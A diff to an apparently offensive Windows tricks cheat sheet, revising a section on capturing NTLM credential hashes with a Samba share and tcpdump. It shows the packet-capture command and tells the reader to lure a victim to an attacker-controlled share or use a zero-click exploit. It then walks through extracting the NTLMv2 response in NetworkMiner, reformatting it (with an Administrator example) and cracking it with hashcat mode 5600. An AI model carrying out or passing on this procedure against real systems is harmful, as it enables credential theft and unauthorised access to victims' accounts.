@@ -1447,7 +1447,7 @@ Same technique using a random transaction ID:
 
 ## >> Capturing NTLM hashes with Samba and tcpdump
 
-If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with NTLM credential grabbing attacks using `Responder.py`, try this.  This assumes you are attacking a domain-joined computer in the my.lab domain and you are able to place a Samba server in the same namespace, e.g. smb.my.lab.
+If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with NTLM credential grabbing attacks using `Responder.py`, try this.  This assumes your attacking computer and victim computer are in the same DNS namespace.  The victim can be either a domain-joined computer or standalone workgroup.  This example uses the my.lab domain and the Samba server is smb.my.lab.
 
 **Setup a minimal Samba server**
 
@@ -1483,14 +1483,16 @@ service smbd start
 tcpdump -nn -vv -i eth0 -s 0 -w ntlm.cap port 445 or port 139
 ```
 
-Lure the victim to access your file `\\smb.my.lab\files\test.txt`
+Lure the victim to access your file `\\smb.my.lab\files\test.txt` or exploit a zero-click vulnerability.
 
-Type `<ctrl>-c` to stop tcpdump and stop the Samba service when you have collected enough packets.  Then open the ntlm.cap file in NetworkMiner.  Go to the "credentials" tab and right-click then copy password for the account whose NTLM hash you obtained.  Note the user name, e.g. user01, associated in the other packet.
+Type `<ctrl>-c` to stop tcpdump and stop the Samba service when you have collected enough packets.  Then open the ntlm.cap file in NetworkMiner.  Go to the "credentials" tab and select the NTLMv2 response packet.  Right-click then copy password, save it in a text file then right-click copy username.
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/nm01.png)
 
 Convert the NTLM hash that looks like this:<br />
-`$NETNTLMv2$MYLAB$<hex>$<hex>$<hex>`
+`$NETNTLMv2$WIN10PRO$<hex>$<hex>$<hex>`
 
 To something like this:<br />
-`user01::MYLAB:<hex>:<hex>:<hex>`
+`Administrator::WIN10PRO:<hex>:<hex>:<hex>`
 
 Crack the converted hash string using hashcat mode 5600 to attempt to recover the plaintext password.
